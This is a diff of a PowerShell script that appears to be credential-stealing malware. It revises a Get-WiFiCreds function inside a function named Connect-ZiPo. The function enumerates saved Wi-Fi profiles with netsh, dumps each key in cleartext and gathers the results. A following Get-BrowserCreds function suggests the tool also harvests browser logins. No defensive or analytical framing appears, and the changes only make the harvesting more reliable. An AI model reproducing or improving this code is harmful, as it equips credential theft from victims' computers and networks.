@@ -84,29 +84,29 @@ function Connect-ZiPo {
 
    function Get-WiFiCreds {
     try {
-        $tempFile = "$env:TEMP\wifiprofiles.txt"
-        cmd /c "chcp 65001 >nul && netsh wlan show profiles" | Out-File -Encoding UTF8 $tempFile
-        $lines = Get-Content $tempFile -Encoding UTF8
+        $output = cmd /c "netsh wlan show profiles" | Out-String
+        $lines = $output -split "`r?`n"
 
-        # Фильтруем строки с названиями сетей
-        $profiles = $lines | Where-Object { $_ -match "All User Profile|Все профили пользователей" }
+        # Выбираем строки, содержащие имя профиля (все строки с ":" и не пустые)
+        $profiles = $lines | Where-Object { ($_ -like "*:*") -and ($_ -notmatch "Group policy") }
 
         if (-not $profiles -or $profiles.Count -eq 0) {
-            return "[INFO] No Wi-Fi profiles found (adapter may be disabled or unavailable)."
+            return "[INFO] No Wi-Fi profiles found."
         }
 
         $results = ""
         foreach ($line in $profiles) {
-            $profile = ($line -split ":")[1].Trim()
+            $parts = $line -split ":"
+            if ($parts.Count -lt 2) { continue }
+            $profile = $parts[1].Trim()
+
             $results += "`n[$profile]`n"
 
-            $detailFile = "$env:TEMP\wifi_detail.txt"
-            cmd /c "chcp 65001 >nul && netsh wlan show profile name=""$profile"" key=clear" | Out-File -Encoding UTF8 $detailFile
-            $detailLines = Get-Content $detailFile -Encoding UTF8
+            $details = cmd /c "netsh wlan show profile name=""$profile"" key=clear" | Out-String
+            $keyLines = $details -split "`r?`n" | Where-Object { $_ -match "Key Content|Содержимое ключа" }
 
-            $keyLine = $detailLines | Where-Object { $_ -match "Key Content|Содержимое ключа" }
-            if ($keyLine) {
-                $results += ($keyLine -join "`n")
+            if ($keyLines.Count -gt 0) {
+                $results += ($keyLines -join "`n")
             } else {
                 $results += "[!] No key found"
             }
@@ -118,6 +118,7 @@ function Connect-ZiPo {
         return "[ERROR] Failed to retrieve Wi-Fi credentials: $($_.Exception.Message)"
     }
 }
+
 
 
     function Get-BrowserCreds {
